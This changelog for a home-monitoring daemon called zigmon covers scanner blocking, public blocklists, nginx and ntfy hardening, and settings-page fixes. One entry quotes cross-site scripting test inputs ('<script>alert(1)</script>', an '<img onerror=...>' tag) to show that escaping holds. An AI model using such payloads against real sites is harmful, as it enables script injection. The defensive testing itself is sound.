    "WPA2 2.4"       1 of 4 shown
    "de:ad"          2 of 4 shown
    "hidden"         1 of 4 shown      (a network with no name of its own)
    "nonsense"       nothing heard matches that.

The filtering happens here, over what was already fetched - the controller is
not asked again for something it has already said - and clearing the box
brings everything back.

`test/render.js` types six filters at a stand-in history and checks each one.

4.19.0 — **country flags**, and **a box to ask about one address**.

*Say which country an address is in* fetches the free db-ip country list once
a month - about three hundred thousand ranges, start and end rather than
CIDRs, which is why that one - and keeps it here. A flag then sits beside
every address on the blocked list, in the counters and in the story of an
address, from the two letters alone: no pictures, no list of two hundred
emoji.

**Nothing is judged by it.** A country is not something an address chooses,
and a scanner in Rotterdam looks exactly like a phone in Rotterdam. It is
there to tell you what you are looking at, and that is all it does.

**And the box.** On the blocked card: type an address, and one answer says
everything this house knows about it.

    89.24.57.142  🇨🇿 CZ  🛡️ on the firehol1 list
    kept out for good.
    1 line(s) in the logs, 1 different path(s), first …, last …
    on its account now: 6 of 15
       1× /.env   — answered 404

An address nobody has ever seen says so plainly, and something that is not an
address is refused rather than looked up. It changes nothing - it only says
what is already known.

Honest about one thing: the country list itself is fetched from db-ip, which
cannot be reached from where I test, so **the download is the one part I could
not try**. The parsing, the storing and the looking up are all tested against
rows in exactly the shape the fetching builds. If `Fetch it now` comes back
with anything other than a count, that is where to look.

4.18.2 — the seven newest settings were drawn on the card and **the daemon
would neither report them nor take them**. Seven boxes, seven blanks, nothing
that could be switched on and nothing that could be saved - because they were
added to the defaults and to the checking, and not to `TUNABLE`, which is the
list of what the page may see and change.

    feeds, feeds_every_h, feeds_weight, feeds_ban,
    proxy_lines_days, proxy_spread_bar, block_ladder_forget_days

All seven are in it now and the card fills in: 24 hours, 3 times, on, 30 days,
30 paths, 30 days.

**And the four switches sat at four different places**, each row being a flex
row of its own that put its switch wherever the label happened to end. One
grid for all of them - name, switch, what it holds - and they line up whatever
the names are.

`test/inputs.py` already refused a release where the daemon takes a setting no
card draws. It now refuses the other way round as well: a setting drawn on a
card that the daemon will neither report nor accept. That is the rule that
would have caught this before you saw it.

Not in this build, and I am not going to pretend otherwise: **the country
flags**. No switch, no download button, no interval, because none of it is
written. The mechanism the lists use is the same one they need - a fetched
file, a table of ranges, one lookup - so it is a parser and a flag in the row
rather than anything new, but it is not done.

4.18.1 — you had the shape of it exactly right, and it works that way now.

**Nothing of a list is pushed to the router.** Four thousand ranges are not a
firewall rule, most of them will never come near this house, and a router
carrying them is a router nobody can read. The lists live here and are asked
one question.

**The first address off one that turns up in a log is kept out for good, there
and then** - not weighed, not laddered - and *only that one address* is sent
to the router. Because that is two things rather than one: somebody else
judged it bad, and it has now knocked on this door.

    ranges held: 2         on the router before: nothing
    one poke from a listed address:
       kept out      for good
       why           1× a path that is not there, at the server in front,
                     and on the firehol1 list
       how           for good: it is on the firehol1 list and it came here
       the router    45.9.148.9        <- that address and nothing else
    one poke from an address on no list:   left alone

**And it wears a shield 🛡️** on the blocked list, in the story of an address
and on the router sheet, beside the globe and the bell - with the list's name
under the pointer. Three marks now for three different places a thing was
seen, and a fourth for a thing that was known before it was ever seen here.

`feeds_ban` turns it off, and then a listed address is only weighed more
heavily than a stranger, as in 4.18.0.

4.18.0 — **the score is worked out in one place**, and on top of that, **lists
somebody else keeps**.

The first part is the fault that stopped the last attempt. What a run of tries
is worth was worked out twice - once where a block is decided, once where the
card is drawn - in the same shape, in two functions. Any weight added to one
of them showed in the number that decides and not in the number shown, or the
other way round: a card reading *9 of 15* while something was being kept out
at 27. One function now, `weigh_recent`, and both ask it.

**Then the lists.** Four public ones, each a switch of its own on the card:
FireHOL level 1, Spamhaus DROP, blocklist.de, DShield. Each is fetched whole
every `feeds_every_h` - a day as it comes - replaces what was held for it, and
says underneath how many ranges it holds and when it was last fetched. *Fetch
them now* does it there and then.

**Being on a list is not by itself a reason to keep anybody out.** An address
still has to do something here. But everything it does weighs three times as
much (`feeds_weight`), because the benefit of the doubt was used up elsewhere:

    three pokes, on no list     9 of 15   left alone
    three pokes, on a list     27 of 15   kept out

The ranges are stored as packed bytes rather than text, because text sorts as
text - `9.0.0.0` comes after `10.0.0.0` as a string - and a list compared that
way lets through exactly the addresses it was fetched to stop. IPv4 and IPv6
alike, CIDRs and bare addresses, comments and rubbish skipped.

`test/taps.py` checks six addresses in and out of three ranges of both
families, that a listed address weighs exactly three times what an unlisted
one does, and **that the number shown is the number that decided** - which is
the thing that went wrong.

Country flags are the same mechanism - a fetched file, a table of ranges, one
lookup - and are next.

4.17.0 — your instinct was right, and it is the fix the last four releases
kept dancing around: **the lines are kept, and the questions are asked of the
table.**

Streaming past a log line can only ever ask *what is this one line worth*.
Everything that actually catches somebody is a question about many lines at
once - how many different paths in an hour, how long between tries, has this
address ever been seen before, what did it do across all six logs in order -
and none of that can be answered by a counter that forgets in ten minutes.

So every line read off the server in front is now written into `proxy_lines`:
time, which log, address, method, path, status, and what the weighing made of
it. Kept **thirty days** (`proxy_lines_days`), swept nightly.

**The first question asked of it**, and the difference is stark:

    one path asked for sixty times   spread  1   score   1   left alone
    forty different paths            spread 40   score 155   kept out

Sixty requests for `/tap` is a watch with a stale shortcut. Forty different
paths is somebody working through a list - and **every one of those lines
looked ordinary on its own**, which is exactly why reading them one at a time
caught so little. `proxy_spread_bar` sets where a visit stops and a sweep
begins; thirty paths in an hour as it comes.

This is a foundation rather than a finished thing, and worth saying plainly.
What the table now makes possible, and what I have not written yet: bursts
treated as one visit rather than six events, so your own quick look never adds
up; the time between tries, which tells a script from a person more surely
than anything else; and re-running a changed rule over the last month instead
of only over what comes next. Those are the next sitting's work, and they are
now a query each rather than a redesign.

4.16.1 — **the help panel was showing its own markup as words.** A couple of
settings were written with a little `<code>` and `<i>` in them, and the panel
escapes what it is given - which is right, and is how a value with a bracket
in it stays a value rather than becoming part of the page.

The answer is not to stop escaping. Everything is escaped as before, and then
exactly three harmless tags are let back in: `code`, `i`, `b`. A `<script>` or
an `<img onerror=...>` written into a setting is still shown as the text it
is.

    the list <code>10, 60</code>   ->  the list 10, 60   (in a code face)
    a <script>alert(1)</script>    ->  a <script>alert(1)</script>

While in there: the ladder's own explanation told the same two things twice
over, a leftover from before the editor was built. It is a third shorter and
says each thing once.

`test/render.js` refuses a release where the panel shows a tag as text, or
lets one through that is not on the list of three.

4.16.0 — **all eighteen sections, not two.** Every setting on the card is in a
cluster with the things it belongs with: **118 settings, 35 clusters, none
left loose.**

    WHEN TO WARN ABOUT A DEVICE
      batteries · how well it is heard · readings out of their range
    WHEN A DEVICE HAS GONE QUIET
      how long before it counts as quiet · and how long each kind may be quiet
    HOW OFTEN THE BOXES ARE ASKED
      the smart plugs · everything else
    WHAT GETS WRITTEN DOWN
      the debug log · what is kept, and for how long
    MONEY AND PLACE          what it costs · where the house is
    HEATING                  warming a room early · a head turned by hand
    WATCHING OVER THINGS     what is worth saying · the mesh itself
    ONE-TAP LINKS            where the links answer from · the second factor
    THE ROUTER               the machine · the list it carries
    NOTIFICATION CHANNELS    where messages go · and Telegram

and the rest the same way. A cluster wraps only among itself, so nothing can
land a user on one line and its password on the next again, whatever the width
of the window.

Two of them caught me out: *Money and place* and *Weather* have keys that
appear twice in the file - once in the list of things a message can say, once
in the layout - and the marker went on the wrong one. The count of what is
left loose is what found it, which is why `test/render.js` now names any
setting that is not in a cluster rather than only counting clusters.

4.15.1 — **the ladder never forgot, and it kept the owner out of his own
house for good.**

Look at what that last block was made of: `GET /tap` answered 405, and `GET
/ntfy` answered 404 - six requests in half a minute from a browser being
pointed at a server to see what it does. Six knocks are not an attack. But
`kept out 7× before` counted every block since the database was made, months
of them, so the ladder was at its last rung and the answer was *for good, by
the ladder*.

The ladder and the doubling now look back **thirty days** - `block_ladder_forget_days`,
and 0 keeps the old behaviour. An address that has behaved for a month starts
at the bottom again:

    seven blocks, all four months old   -> the first time from this address: 10 min
    three blocks this week              -> for good

That is the difference between a guard and a grudge.

What is not fixed yet, and is the harder half of what you are pointing at: six
requests in half a minute are still six events rather than one visit. The
weighing has no notion of a burst belonging together - one caller, one
handful of seconds, a browser's worth of paths - and that is what would stop a
quick look ever adding up at all. It wants thinking about properly rather than
another weight nudged at the end of a long evening, so it is the next thing.

Meanwhile, to get yourself back in: *Take them all off* on the blocked card,
and the thirty days does the rest.

4.15.0 — **clusters**, because reordering was never going to fix it.

A section was one long stream of boxes, and a stream wraps wherever the width
runs out. So however carefully the order was written, a user could end one
line and its password begin the next with something unrelated between them -
which is exactly what you circled.

A cluster is its own little grid across the whole width: **what is in it wraps
only among itself, and the next cluster starts on a fresh line**, under a
small heading of its own. The switch that turns a thing on sits at the head of
the cluster it governs.

    THE MACHINE
      address · port · user · how it logs in · password
    THE ONE-TAP ROAD'S LOGS
      access log · error log
    THE NOTIFICATION SERVER'S NGINX LOGS
      read them · access log · error log
    NTFY'S OWN TWO FILES
      read them · its own log · its ban feed
    HOW OFTEN ALL OF IT IS READ
      how often · read it by itself

and in *Keeping addresses out*: **whether and how keen**, **how long a block
lasts** (the ladder among them, on its own line), **the house and who is never
kept out**.

`test/render.js` refuses a release where the pairs that must not be parted -
the user and its password, each log and its error log, a switch and the boxes
it governs - have ended up in different clusters.

Honest about the scope: the two sections you circled are clustered. The other
sixteen are still one stream each, and the mechanism is now there to do them -
that is the next sitting's work, not something to rush at the end of this one.

4.14.2 — the settings card, tidied where it had gone crooked.

**The worst of it: a note half a screen below the box it was about.** *not
used while a ladder is set* sat at the bottom of a row whose height was set by
the ladder editor beside it - a dozen rows tall - because every item in a row
shares the row's three bands. The ladder takes **a line of its own** now, so
the short boxes keep short rows and their notes sit under them where they
belong.

**And the server section reads in order**: the machine, then how it logs in -
the user and its password side by side rather than at the end of one line and
the start of the next - then each log beside its own error log, then ntfy's
pair, then ntfy's own pair, and last how often the whole lot is read. *How
often to read it* had also been drawn nowhere at all since the ntfy settings
went in, which `test/inputs.py` caught the moment the section was rebuilt.

`test/render.js` refuses a release where nothing on the card is marked tall,
or where a tall item shares its row.

4.14.1 — **a bell 🔔 for what the notification server saw**, beside the globe
🌐 for the server in front. Two different machines, two different marks, and
an eye 👁 where the house saw it itself.

An address weighed out of ntfy's own log or its ban feed now says where it was
seen - *(seen at the notification server)* - and carries the bell on the
blocked list, on the counters, in the story of an address and on the router
sheet, exactly where the globe already was.

    🔔 45.9.148.9    3× refused so often that the notification server wrote it down
    🌐 45.9.148.11   5× a path that is not there, at the server in front

4.14.0 — **ntfy's own two files are read as well**, where they are named and
switched on: *And ntfy's own two files*, with a box for its log and one for
its ban feed. Six logs now, all through the same sweep.

These are not nginx logs and are not read as though they were.

**The ban feed** is the easy one, and the best of the six: every line in it is
an address ntfy has already judged - refused often enough in its own window to
be written down - in its documented shape, `<time> <ip> <prefix> <http-code>
<ntfy-code>`. A decision already made weighs five, so three lines are a block.
IPv6 addresses in it are read as readily as IPv4.

**Its own log** is read for the lines that name a visitor and complain - a
refused token, a flood - and its chatter about how many messages are cached,
or that it has started listening, says nothing about anybody and is ignored.
That is most of the file: of the fifteen lines you sent, fourteen were stats
and one was a startup.

Both files want to be somewhere ntfy can write, which is `/var/lib/ntfy` and
not `/var/log` - the unit runs as the ntfy user. `zigmon --proxy` lists all six
paths when they are being read, and the boxes go quiet while their switch is
off.

4.13.1 — a fresh day of all four logs, read end to end, and a look at whether
nginx publishes more than it must.

**Nothing in the logs goes unread.** 3,022 tap lines and 317 ntfy lines, every
one of them either a request the pattern reads or bytes it counts as junk -
none fell through. Every status that appears is accounted for: on the tap road
404, 405, 400, 403, 429, 444 and 504; on ntfy 200, 401, 403, 404 and 502. The
two error logs come to 28 lines weighed as failed handshakes and 18 left alone
as our own servers being slow.

**And nginx published three things it did not need to.** The ntfy block had no
rate limit at all, allowed every method through to ntfy, and took a body of
any size:

    limit_req zone=ntfy_front burst=40 nodelay;
    limit_except GET POST PUT HEAD OPTIONS DELETE { deny all; }
    client_max_body_size 1m;

A phone opening a subscription uses one of the forty and then sits still;
something working through a list of tokens runs dry and is answered 429 - which
the house reads out of that same log and weighs. An odd method is refused
before ntfy is woken, and refused with a 405, which is also weighed. And with
attachments off in server.yml, nothing legitimate is bigger than a message, so
a megabyte is a ceiling nobody can stream through.

One thing in the config you pasted: `log-file` was still set, a line below a
comment explaining why there should not be one. It works where you put it -
/var/lib/ntfy is ntfy's own ground - but the file in this release has it
commented out, which is what the comment above it says.

`test/nginx.py` refuses a release where the ntfy block has no rate limit, no
limit on methods, or no body limit.

4.13.0 — you were right that the hammering stopped being caught, and the
reason was worse than the rules I had changed.

**A line read out of a log was weighed at the moment it was read, not at the
moment it happened.** So a whole reading landed in the same instant - and the
folding that exists so a browser retrying twice counts once folded a flood of
three hundred identical knocks into a single one. Whatever the weights said,
the count was one. Every line now carries the time nginx wrote beside it, held
to what is sensible: a line claiming tomorrow, or last month, is taken as no
time at all rather than believed, because a log is a file anybody with a pen
could edit.

    forty knocks, five seconds apart   40 of 15   kept out
    three knocks in the same second     1 of 15   left alone

**And what 4.12.1 stopped weighing is weighed again, by rate rather than by
kind.** A 405, and a 404 on what a browser asks for by itself, weigh **one**:
two or three is somebody seeing whether the server is up, forty is something
hammering, and the counting gets there on its own without anybody deciding who
is who. A refusal on `/tap` weighs two again - the same press counted twice is
a smaller fault than a flood counted not at all.

Nothing looks at which address it is. On the day's four logs: **19 addresses
kept out**, the heaviest carrying 63 against a bar of 15.

4.12.2 — a fair thing to be suspicious about, so it is checked rather than
promised: **the program spares no address of its own.**

Every address in zigmon.py was read out. What is there: `127.0.0.1` and `::1`,
which is the machine it is running on and the only thing it may recognise
without being told; `0.0.0.0` as a listen address; and addresses inside
comments and examples, which decide nothing. Nothing of a real house is
written into the code, and nothing ever was - who is let by is the house's
business and lives in **Never kept out**.

`test/endpoints.py` now reads every address the program compares against and
refuses a release where any of them is anything but the loopback. If somebody
ever quietly adds a range "just for now", the release stops.

Worth being clear about what yesterday's change was, since the two are easy to
confuse: it stopped weighing a **405**, a **404 on what a browser asks for by
itself**, and a **refusal the house's own guard had already weighed**. Those
are about what was done, not about who did it - they apply to every address
alike, yours and a scanner's.

4.12.1 — the ntfy tool, rewritten where it touches the terminal. Four things,
all of them things you found.

**Arrows still closed it over SSH.** The fix before still leaned on a timer -
read one byte, then wait 60 ms to see whether more arrive - and a timer is a
poor way to ask that question from the other end of a link. The terminal is
put into raw mode with VMIN=1, VTIME=0 instead: one read waits for a byte and
then hands over everything that came with it, so an arrow arrives whole every
time, at any latency. Seventeen sequences are checked at every release,
including PuTTY's `ESC O A` shape.

**Esc while typing now gives up.** `input()` has no idea what Esc is, so a
question once asked had to be answered. Typing is read key by key now -
letters, Backspace, Enter, Esc - and Esc hands back nothing and goes where it
came from.

**The flicker is gone.** Every keypress cleared the screen and then drew it:
over a slow link, that moment with nothing on it is the flicker. Each frame is
now written over what is there in one go, erasing to the end of each line and
then to the end of the screen.

**The cursor only lands on things that can be chosen.** The rules and headings
between items are drawn but never stopped on.

And the log no longer flashes past: it goes into a pager that scrolls, shows
two hundred lines, and stays until Esc. The server screen gained *Everything
ntfy is set to*, which reads the config file into the same pager.

4.12.0b — all four of a real server's logs, read in one sweep, and the reading
kept the owner out of his own house twice.

**A phone that had pressed a link eighteen times successfully was kept out for
nine presses the house itself refused.** A 401 or a 403 on `/tap` is the
house's own guard saying no - the API weighed it already, knowing which link,
which code and who - and weighing the proxy's copy as well counts one refusal
twice and counts a mistyped code as a stranger's work. Those are left to the
API now, which knows more.

**And opening the address in a browser earned a block.** `GET /tap` is the
wrong method on the one road there is, answered 405; a browser does it to see
whether the server is up, and so does every link preview. Three hundred of
them from one address were the owner checking his own server. A 405 is not
weighed at all now, and neither is a 404 on what a browser asks for without
being told to - `/`, `/favicon.ico`, `/robots.txt`, the touch icons, the
manifest.

A stranger walking paths nobody would guess is weighed exactly as before.
After both: **19 addresses kept out of a real day, every scanner among them,
and the phone, the daemon and the notification app all left alone**.

One thing that is not a fault: an address asking for `/tap/<something>` again
and again is guessing link secrets, and is kept out whoever it belongs to. If
that is you testing, your own address belongs in *Never kept out*.

4.12.0 — **the notification server's logs are read as well**, where they are
named and switched on: *The server that faces the internet* -> *Read the
notification server's logs too*, with a box for each of its two logs.

And they are read by **narrower rules than the one-tap road's**, because
reading them the same way would have been actively harmful. On a real day of
that server:

    46.227.172.22   40 × 404    his own browser
    192.168.40.170   5 × 403    his own phone
    45.9.148.7       6 × 401    somebody trying it on

With the web app switched off, opening the address at all asks for
`/config.js`, `/sw.js`, the manifest and the favicon and gets a four hundred
for each - that is a **browser**, not a scanner. A 403 is usually a client of
your own asking for something it is not allowed: a phone with read-only access
trying to publish. Weighing either would have kept the house out of its own
notifications, and it would have looked like the blacklist working.

So on that log only three things count: a **401**, which is a request carrying
no name the server would take, a 429, and bytes that are not a request. Its
error log is weighed exactly as the other one is. Tried against the real file:
the browser and the phone are left alone, six tries with no name earn a block.

`zigmon --proxy` lists both paths when they are being read, and the two boxes
go quiet while the switch is off or while there is no server in front.

4.11.1 — **every arrow key closed the screen it was pressed on.**

An arrow is three bytes - ESC [ A - and the whole of it arrives at once. I was
reading through `sys.stdin`, which is a buffered text stream: the first read
pulled all three bytes into Python's own buffer, `select()` then said the
terminal had nothing more to give, and the escape read as a bare Esc. Which is
exactly what Esc does - go back - so the tool did what it was told, for the
wrong reason.

It reads the file descriptor itself now, with `os.read`, and understands both
shapes a terminal uses for the arrows (`ESC [ A` and `ESC O A`), Home, End,
Page Up and Down, Backspace, and a bare Esc for going back. Where it is not
attached to a terminal at all it reads plainly instead of falling over.

The part that works out *which* key was pressed is kept apart from the part
that reads bytes, so it can be tried without a terminal: `test/cli.py` now puts
eleven real key sequences through it.

4.11.0 — **tools/ntfy-admin.py**: everything the ntfy command line can do,
without having to remember any of it.

    sudo tools/ntfy-admin.py

Arrow keys move, Enter chooses, Esc goes back, q quits. Every screen shows
what is there rather than asking you to know it - the users with their roles,
what each may read and write, the tokens each holds with their labels and when
each was last used, what the server is set to, and the last of the log:

    Users
    ▸ falco              1 grant(s)   1 token(s)
      zigmon             1 grant(s)   0 token(s)
      admin              1 grant(s) admin
      ──────────────────────────────
      Add a user

Choosing one opens it: give it a topic or a pattern with the permission picked
from a list rather than typed, take all its access away, make and remove
tokens with a label and a life, change its password or its role, delete it.
*Anybody, with no name given* is the anonymous user, shown as what it is - a
hole in `deny-all` if there is anything in it at all.

It shells out to `ntfy` for everything, so it can do nothing you could not do
by hand, and where ntfy wants to ask for a password itself it is handed the
terminal to ask on: **nothing in the tool ever holds a password**. One file,
no dependencies beyond Python 3.7 and the ntfy binary; colorama is used if it
is there, plain ANSI if it is not.

`test/cli.py` loads it and runs its readers against ntfy's own output shapes,
because that output is the only thing holding the two together - and a change
in either would make the tool show an empty list rather than an error, which
is the worst way to be wrong.

4.10.0 — the ntfy address is **built rather than typed**. An address is a
server, a topic and whichever credentials that server wants, and written as
one line it is the colons and the at-sign that get put in the wrong place -
once, and then not found.

A dropdown for what kind of server it is, and the boxes that go with it:

    A public server — ntfy.sh, the topic is the whole secret
        The server   https://ntfy.sh
        The topic    a-word-nobody-can-guess

    A private server — with a token
        The server   https://ntfy.falco81.net
        The topic    zigmon-house
        Its token    ••••••••

    A private server — with a user and a password
        ... The user, Its password

Under them, what will actually be saved, with the credentials blotted:
*what is saved: https://…@ntfy.falco81.net/zigmon-house*. The labels share one
column so the boxes line up however long the words are, and the item sits in
the same three bands as everything else on the card.

What is stored is the single URL the daemon has always read, so nothing behind
the page changed - and an address already in there is taken apart into the
right boxes when the card is drawn. A password with an at-sign in it survives
the round trip. Half an address saves nothing rather than something broken.

`test/render.js` takes all three shapes apart and puts them back, and checks
each choice shows its own boxes and no others.

4.9.2 — I told you to give the phone a token and the phone wanted a name and
a password. The note in the ntfy config said the opposite of the truth: that
`enable-login: false` leaves a password login nowhere to go.

It does not. `enable-login` shuts the endpoint the **web app** uses to swap a
password for a token; a phone doing its own Basic auth on the request itself
never touches it, and the name and password are checked against the user
database directly. The iOS app asks for a user and a password, and that works
exactly as it stands.

So: the phone signs in as its own user with the password `ntfy user add` asked
for, and the token stays with the daemon, which does take one.

4.9.1 — **the iPhone will not ring without an upstream**, and I left it out of
the config I sent.

Apple only wakes an app through APNS, and APNS only talks to servers
registered with it. ntfy.sh is; a server of your own is not. So a self-hosted
ntfy has no way to make an iPhone ring at all - the message sits there until
somebody opens the app, which looks exactly like "it does not work" and is
impossible to guess from the symptom.

    upstream-base-url: "https://ntfy.sh"

With it, every message makes this server send ntfy.sh a **poll_request
carrying the message id and nothing else**. ntfy.sh wakes the phone through
APNS, the phone comes back here and fetches the message itself. Neither
ntfy.sh nor Apple ever sees a word of what was said.

Android does not need it - the app holds its own connection - but it costs one
small request per message, so it stays set where there is an iPhone in the
house.

The file also gained the two curls that say which half is quiet: hold a
subscription open by hand and publish into it. If the first window prints the
message, the server, nginx and the tokens are right and it is the app - and
then it is the upstream on an iPhone, or Android's battery optimisation
killing the app's connection, or a server added with a password where
`enable-login: false` means there is nowhere for a password to go.

`test/nginx.py` refuses a release where no upstream is named.

4.9.0 — **Test ntfy alone** and **Test Telegram alone**, beside the button
that tries them all.

Sending down every road at once tells you that something arrived. It does not
tell you which one is the one that did not, which is the whole of the question
somebody setting up a second channel has. Each road can now be tried by
itself, and the message says so when it lands: *A test message from the
dashboard, down ntfy alone.*

A button is greyed while its road is not set up, rather than asking for the
PIN and then saying *not set up*; the daemon refuses an unknown or unset road
with 400 either way.

Tried against a listener: ntfy alone reaches ntfy and nothing else, Telegram
alone goes to Telegram and nothing else, the old button still reaches both,
and a road that is not configured is refused. `test/render.js` refuses a
release where either button is missing, has no icon, or does not follow
whether its road is set up.

4.8.4 — yes, the *ntfy topic URL* field takes a private server, and here is
the proof rather than the claim. A real POST, to a real listener, from the
daemon:

    the address it posted to : /zigmon-house
    Authorization it sent    : Bearer tk_7327...
    Title                    : Freezer
    the message              : The freezer is warming

The token comes out of the address and goes into the header, so the far end
never writes it into its own log.

**And this end no longer writes it either.** An address of the form
`https://:tk_...@host/topic` or `https://user:pass@host/topic` is blotted
wherever it is logged, and the whole of the part in front of the host goes -
not just the token, because knowing which account is half of guessing it:

    POST https://…@ntfy.falco81.net/zigmon-house

An address with no secret in it is left exactly as it is. `test/endpoints.py`
checks all four shapes.

4.8.3 — my config would not start, and the reason it gave was three reasons
deep. `log-file: "/var/log/ntfy/ntfy.log"` asks ntfy to open a file in a
directory that does not exist; make the directory and it is *permission
denied*, because the unit runs as `User=ntfy` and /var/log is not the ntfy
user's ground; and either way it is **fatal at startup**, so systemd tries
five times in a second and gives up with *start request repeated too quickly*,
which says nothing about a log file at all.

**There is no log-file now.** The unit runs in the foreground and journald
already keeps everything - `journalctl -u ntfy` - so the setting only added a
directory to get the ownership wrong on. `ban-file` moved to
`/var/lib/ntfy/ban.log`, beside the user database, which is ground ntfy
certainly owns.

The setup lines lost /var/log/ntfy with it, and gained the two questions worth
asking when it still will not start: `sudo -u ntfy touch /var/lib/ntfy/probe`,
and `ausearch -m avc -ts recent` for when it is SELinux saying no.

`test/nginx.py` refuses a release where the ntfy config writes any file
outside /var/lib/ntfy or /var/cache/ntfy - which is the rule I broke.

4.8.2 — **deploy/ntfy-server.yml**: the whole of a private ntfy, written out.

Nothing anonymous (`auth-default-access: deny-all`), no web app at all
(`web-root: "disable"` - no login page, no /static, no account pages), no
signing up, no reservations, no attachments (by naming no cache directory, so
there is no upload road and no disk to fill), no metrics, the loopback and
nothing else to listen on, and `behind-proxy` so one noisy phone cannot
silence the house by being mistaken for nginx.

Then the limits: 4 kB a message, a bucket of twenty requests refilled one
every five seconds, five hundred messages a day and thirty subscriptions from
one address, and this machine exempt because the daemon publishes from here.
And `ban-file`, where ntfy writes down every address it has refused, so
fail2ban - or the counting in this house - can act on it without reading the
whole access log.

At the end, the six commands that make the two users: the daemon `write` and
never read, the phone `read` and never write, a token each, and the two curls
that prove it - the first taken, the second refused for saying nothing about
who it was.

Every option in it is one ntfy documents. A misspelled key in a YAML file is
not an error, it is a setting that silently does nothing - which for
`deny-all` would be an open server that looks shut - so `test/nginx.py` reads
the file and refuses a release where any of the six that matter has drifted.

4.8.1 — ntfy moved to a name of its own: **https://ntfy.falco81.net**, on the
same 443 as the links, chosen by the name in the request. The port-of-its-own
version is gone; what is left needs no odd port in any address and no hole in
the firewall.

Three things it wants first, and the file says so at the top: a DNS record
beside mqtt's, **a certificate that carries the name** - one certificate for
both names is a single certbot line - and the reminder that this block must
not become the default. The default on 443 is still the one that refuses
everything it does not know, so a request for a third name gets nothing.

It also gets a block on port 80 that does nothing but redirect, because the
default there closes what it does not know and **a certificate cannot be
issued over a door that does not open**: certbot's HTTP-01 challenge is
answered on 80, by name.

Everything else is as it was: the loopback, `behind-proxy`, the unbuffered
subscriptions, the SELinux boolean that costs an hour if you miss it, and the
whole of shutting it properly - `deny-all`, a write-only daemon, a read-only
phone, tokens, no web app.

4.8.0 — **a private ntfy, properly shut**, and the one thing in zigmon that
had to change for it to work.

`deploy/nginx-ntfy-front.conf` now carries the whole recipe: `deny-all` so
nothing is anonymous; **two users, because the daemon and the phone want
opposite things** - the daemon `write` on `zigmon-*` and never read, the phone
`read` and never write, so a stolen daemon token cannot hand your
notifications back and a stolen phone token cannot send a fake one; tokens
rather than passwords, so what sits in a config file is not the password to
the account; `enable-signup: false`, `enable-reservations: false` and
`web-root: "disable"`, which leaves the API and removes the web app, the login
page and `/static` altogether; attachments left off by not naming a cache
directory; and two limits, since a token can leak too. What that leaves
reachable from the internet is a POST with a token to one topic pattern, a GET
with a token to the same, and 401 for everything else.

**And zigmon can now say who it is.** urllib does nothing with a user and
password in a URL - it leaves them there, so the server would have seen a
token in the address and no credentials at all, and answered 401 to every
notification. Both forms are understood and taken out of the address before it
is used:

    https://:tk_abc…@ntfy.example.net:8443/house      sent as Bearer
    https://user:password@ntfy.example.net/house       sent as Basic

so neither ends up in a log the far end keeps. A password with an at-sign or a
slash in it is unescaped properly. `test/endpoints.py` checks all three
shapes.

Also in the file: the ntfy error log named under *The server that faces the
internet* means somebody guessing tokens is weighed and kept out with
everybody else.

4.7.4 — the ntfy config now carries the five steps on the machine itself, in
order, because two of them are the ones that actually bite on RHEL: **8443 is
not a port firewalld knows**, and **SELinux will not let nginx open a local
port** until it is told to. Without the second, nginx starts, ntfy answers on
the loopback, and every request is 502 with *Permission denied ... connect()*
in the error log - which looks like anything but a policy.

    firewall-cmd --permanent --add-port=8443/tcp && firewall-cmd --reload
    setsebool -P httpd_can_network_connect 1

and two curls at the end to tell which of the three it is if it does not work.

4.7.3 — **deploy/nginx-ntfy-front.conf**: ntfy on the server that faces the
internet, beside the one-tap road, without either getting in the other's way.

The half of the question that is easy: ntfy stops fighting nginx for port 80
the moment it is told `listen-http: "127.0.0.1:2586"`, and `behind-proxy:
true` makes it believe the forwarded address so its own rate limiting counts
the caller rather than counting nginx.

The half that is not: **`https://mqtt.falco81.net/ntfy` is not a thing ntfy
does.** It serves its API and its web app from the root of whatever name it is
given - `/v1/...`, `/<topic>`, `/<topic>/ws`, `/static` - and its own settings
call base-url "the root URL for the ntfy server". Under a path prefix the web
app asks for `/static`, the websocket opens on `/<topic>/ws`, and the
attachment and e-mail links it writes point at addresses that are not there.
It half-works, which is worse than not working.

So the file gives it a root of its own on a port of its own -
`https://mqtt.falco81.net:8443/` - which needs no new certificate and no DNS
record and leaves 443 to the links. The comment at the top says how to do it
as `ntfy.falco81.net` instead, for anyone whose certificate covers the name.

The proxying is ntfy's own recommended shape: no buffering either way, the
websocket upgraded, three-minute timeouts, `client_max_body_size 0` so an
attachment is streamed. A subscription is one request held open for hours;
buffered, every message waits for nginx to feel like letting go. The bare
address is refused with 444 as everywhere else on that machine.

`test/nginx.py` refuses a release where any of that is missing, or where ntfy
is published under a path prefix.

4.7.2 — you were right to ask. The lines on the router sheet were always that
address's own - never anybody else's, never a random handful of the log - but
they came from the counter, and **the counter holds only the last few
minutes**. So beside an address kept out an hour ago there was either nothing
at all, or whatever it had tried *since* - which reads as the reason and is
not.

**What earned a block is now kept with the block**, at the moment it is made:
the very lines it was judged on, as they were then. They survive the window
passing, a restart, and *Forget what they have been doing*. The sheet labels
them **what earned it - the N line(s) it was judged on**.

**And what it has tried since is shown separately**, under *and since it was
kept out - N more, all refused*, with nothing appearing in both. An address
put there by hand says so instead; one kept out before this version says that.

`test/taps.py` checks that twelve refused paths leave twelve lines with the
block and that wiping the counters does not take them; `test/render.js`
refuses a release where the sheet does not label what earned it, or does not
tell the later tries apart from it.

4.7.1 — the error log was never actually read: **proxy_path() takes 0
positional arguments but 1 was given**, in the trouble line where a reading
should have been. It takes no path - it takes nothing at all and reads the
setting itself - and I handed it one. It takes the *name of the setting* now,
so the two logs each find their own.

The reading went wrong on every sweep and the only sign was that line in
`zigmon --proxy`, which is at least where it belongs. Both of a real server's
logs, read together in one sweep: **23 addresses kept out**, the scanners from
the access log and the two that could not finish a handshake, and the owner's
own phone untouched.

`test/taps.py` now runs a whole sweep against two stand-in files and refuses a
release where it leaves anything in the trouble line, or where either log goes
unweighed.

4.7.0 — **nginx's error log is read too**, where you name it: *The server that
faces the internet* -> *And its error log*, usually
`/var/log/nginx/zigmon-tap-error.log`.

The access log only holds callers that managed to send a request. The other
log holds the ones that did not: a handshake that failed, a record nginx could
not read, plain HTTP sent to the TLS port, a caller past the rate limit. A
browser fails one of those once on a bad line; an address that fails one every
few minutes is working through a list of things to try.

On a real day of one, 32 lines:

    69.67.183.104    11 failed handshakes and reads   -> kept out
    212.102.40.218    6 over three hours              -> kept out
    eleven others     one each                        -> left alone

**And the lines about this house's own server being slow to answer are left
alone** - four `upstream timed out` lines naming the phone that pressed the
